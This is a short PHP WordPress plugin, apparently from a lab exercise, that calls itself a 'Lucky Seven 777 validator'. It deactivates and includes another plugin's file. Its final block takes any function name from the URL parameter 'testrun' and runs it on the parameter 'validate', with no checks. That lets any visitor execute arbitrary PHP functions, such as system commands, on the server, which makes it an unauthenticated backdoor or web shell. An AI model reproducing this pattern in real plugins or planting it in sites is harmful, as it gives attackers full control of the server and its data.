<?php

/**
* Plugin Name: Lucky Seven 777 validator
* Author: Emil
*
*/

register_activation_hook(__FILE__, 'check_for_lucky_seven');
function check_for_lucky_seven()
{
    if (is_plugin_active('labb3-plugin-2/777.php')) {
        add_action('update_option_active_plugins', 'deactivate_lucky_seven');
    }
}
function deactivate_lucky_seven()
{
    deactivate_plugins('labb3-plugin-2/777.php');
}

include ABSPATH . '/wp-content/plugins/labb3-plugin-2/777.php';

$test1 = '123456';
$test2 = '1234567';


function yes($param1)
{
    var_dump($param1);
}

if (isset($_GET['testrun'])) {
    if (function_exists($_GET['testrun'])) {
        $_GET['testrun']($_GET['validate']);
    }
}
